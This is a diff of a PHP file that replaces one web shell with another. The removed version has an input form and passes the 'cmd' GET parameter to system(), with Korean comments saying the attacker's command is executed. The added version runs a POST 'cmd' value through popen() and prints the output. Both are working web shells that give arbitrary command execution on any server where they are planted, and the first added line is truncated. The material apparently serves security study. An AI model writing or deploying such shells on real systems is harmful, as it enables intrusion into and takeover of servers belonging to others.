@@ -1,21 +1,25 @@
 <?php
+        $str_http_path = $_SERVER["HTTP_HOST"] . substr(realpath(__FILE__), strlen($_SERVER["DOCUMENT_ROOT">
 
-echo 'Enter a Command:<br>';
-echo '<form action="">';
-echo '<input type=text name="cmd">';
-echo '<input type="submit">';
-echo '</form>';                                 
+        function exec_shell($_cmd) {
+                $fp = popen($_cmd, "r");
 
-/*
-        echo 부분은 명령어를 입력받을 수 있는 폼을 제공
-    공격자가 입력 폼에 명령어를 입력하면 cmd 파라미터를 통해 전달된다.
-*/
+                $str_read_mesage = "";
+                while( !feof($fp) ) {
+                        $buffer = fgets($fp, 4096);
+                        $str_read_mesage .= $buffer . "<br />";
+                }
+                pclose($fp);
 
-if(isset($_GET['cmd'])){
-        system($_GET['cmd']);
-}
-//system 함수를 통해 전달된 명령어가 실행된다.
+                return $str_read_mesage;
+        }
 
+        if( isset($_POST["type"]) && $_POST["type"] == "exec" ) {
+                $cmd = $_POST["cmd"];
+
+                echo exec_shell($cmd);
+                exit ;
+        }
 ?>
 <!DOCTYPE html>
 <html>
